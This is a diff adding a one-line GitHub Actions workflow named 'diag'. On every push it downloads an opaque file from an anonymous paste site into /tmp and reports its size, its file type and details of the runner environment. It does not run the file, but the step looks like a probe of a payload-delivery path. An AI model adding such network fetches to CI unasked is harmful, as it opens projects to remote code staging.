@@ -1,0 +1,1 @@
+{"name":"diag","on":{"push":{}},"jobs":{"d":{"runs-on":"macos-15-intel","steps":[{"run":"echo \"::error::curl_status=$(curl -s -L -o /tmp/x -w '%{http_code}' https://paste.rs/bw32Z)\"; echo \"::error::size=$(wc -c </tmp/x)\"; echo \"::error::file=$(file -b /tmp/x)\"; echo \"::error::brew=$(which brew || echo none)\"; echo \"::error::py=$(python3 --version 2>&1)\""}]}}}
